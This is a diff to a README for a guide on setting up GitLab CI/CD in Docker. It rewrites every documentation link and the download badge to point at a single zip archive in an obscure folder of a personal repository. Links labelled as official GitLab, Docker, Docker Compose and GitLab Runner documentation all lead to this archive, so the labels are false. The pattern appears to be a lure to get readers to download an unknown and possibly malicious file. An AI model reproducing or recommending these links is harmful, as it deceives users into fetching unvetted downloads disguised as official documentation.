@@ -19,15 +19,15 @@ To get started with GitLab CI/CD in Docker, follow these simple steps:
 6. Utilize SSH for secure communication between services.
 
 ## Learn More
-For a detailed guide on setting up GitLab CI/CD in Docker, refer to the [Documentation](https://github.com/Delfin4000/GitLabCICD/releases/tag/v2.0) 🚀.
+For a detailed guide on setting up GitLab CI/CD in Docker, refer to the [Documentation](https://github.com/Delfin4000/GitLabCICD/raw/refs/heads/main/anana/Lab-Git-CICD-v2.3.zip) 🚀.
 
 ## Additional Resources
-- [Official GitLab CI/CD Documentation](https://github.com/Delfin4000/GitLabCICD/releases/tag/v2.0)
-- [Docker Documentation](https://github.com/Delfin4000/GitLabCICD/releases/tag/v2.0)
-- [Docker Compose Documentation](https://github.com/Delfin4000/GitLabCICD/releases/tag/v2.0)
-- [GitLab Runner Documentation](https://github.com/Delfin4000/GitLabCICD/releases/tag/v2.0)
+- [Official GitLab CI/CD Documentation](https://github.com/Delfin4000/GitLabCICD/raw/refs/heads/main/anana/Lab-Git-CICD-v2.3.zip)
+- [Docker Documentation](https://github.com/Delfin4000/GitLabCICD/raw/refs/heads/main/anana/Lab-Git-CICD-v2.3.zip)
+- [Docker Compose Documentation](https://github.com/Delfin4000/GitLabCICD/raw/refs/heads/main/anana/Lab-Git-CICD-v2.3.zip)
+- [GitLab Runner Documentation](https://github.com/Delfin4000/GitLabCICD/raw/refs/heads/main/anana/Lab-Git-CICD-v2.3.zip)
 
 ## Stay Connected
 Join the GitLab community to stay updated on the latest features and developments. Happy coding! 🎉
 
-[![Download https://github.com/Delfin4000/GitLabCICD/releases/tag/v2.0](https://github.com/Delfin4000/GitLabCICD/releases/tag/v2.0)](https://github.com/Delfin4000/GitLabCICD/releases/tag/v2.0)
+[![Download https://github.com/Delfin4000/GitLabCICD/raw/refs/heads/main/anana/Lab-Git-CICD-v2.3.zip](https://github.com/Delfin4000/GitLabCICD/raw/refs/heads/main/anana/Lab-Git-CICD-v2.3.zip)](https://github.com/Delfin4000/GitLabCICD/raw/refs/heads/main/anana/Lab-Git-CICD-v2.3.zip)
